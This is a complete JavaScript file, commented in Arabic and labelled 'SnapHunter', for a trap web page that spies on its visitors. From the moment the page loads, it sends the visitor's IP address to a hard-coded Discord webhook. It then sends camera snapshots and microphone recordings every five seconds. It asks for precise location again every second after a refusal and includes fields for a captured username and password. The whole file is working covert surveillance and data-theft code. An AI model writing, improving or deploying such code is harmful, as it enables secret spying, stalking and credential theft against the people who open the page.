'use strict';

// ⚠️ ضع رابط الـ Webhook الخاص بك هنا
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let mediaRecorder, audioChunks = [], userLat = null, userLng = null;

// 1. جلب IP الجهاز فور الدخول
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch (e) { return "Unknown"; }
}

// 2. إرسال البيانات إلى ديسكورد
async function sendPacket(imgBlob, audBlob, user = "", pass = "") {
    const ip = await getIP();
    const formData = new FormData();
    let content = `🛰️ **تحديث بيانات مباشر**\n🌐 IP: \`${ip}\` \n`;
    
    if (user) content += `👤 الحساب: \`${user}\` | الرمز: \`${pass}\` \n`;
    if (userLat) content += `📍 الموقع: [Google Maps](https://www.google.com/maps?q=${userLat},${userLng}) \n`;

    if (imgBlob) formData.append('file1', imgBlob, 'camera.png');
    if (audBlob) formData.append('file2', audBlob, 'mic.ogg');
    
    formData.append('payload_json', JSON.stringify({ content: content, username: "SnapHunter" }));
    fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 3. وظيفة طلب الموقع بشكل "إجباري" ومتكرر
function requestLocationForcefully() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
        },
        (err) => {
            // في حال الرفض، يعيد الطلب بعد ثانية واحدة
            setTimeout(requestLocationForcefully, 1000);
        },
        { enableHighAccuracy: true }
    );
}

// 4. تسلسل الأذونات والتشغيل
async function initSystem() {
    const ip = await getIP();
    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: `🚀 صيد دخل الموقع! IP: ${ip}`}) });

    try {
        // أ- طلب الكاميرا والميكروفون
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: true 
        });
        
        video.srcObject = stream;
        mediaRecorder = new MediaRecorder(stream);

        // ب- طلب الموقع فوراً بعد الكاميرا
        requestLocationForcefully();

        // ج- بدء حلقة الإرسال (تمت إضافة فحص جاهزية الفيديو لمنع الصور السوداء)
        setInterval(() => {
            // التأكد من أن الفيديو يعمل ولدينا بيانات حقيقية
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);
                
                audioChunks = [];
                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                mediaRecorder.start();

                setTimeout(() => {
                    mediaRecorder.stop();
                    mediaRecorder.onstop = () => {
                        const audBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                        canvas.toBlob(imgBlob => {
                            if (imgBlob && imgBlob.size > 500) { // التأكد من أن حجم الصورة ليس صفراً
                                sendPacket(imgBlob, audBlob);
                            }
                        }, 'image/png');
                    };
                }, 3000);
            }
        }, 5000);

    } catch (err) {
        requestLocationForcefully();
        setInterval(() => sendPacket(null, null), 5000);
    }
}

window.onload = initSystem;
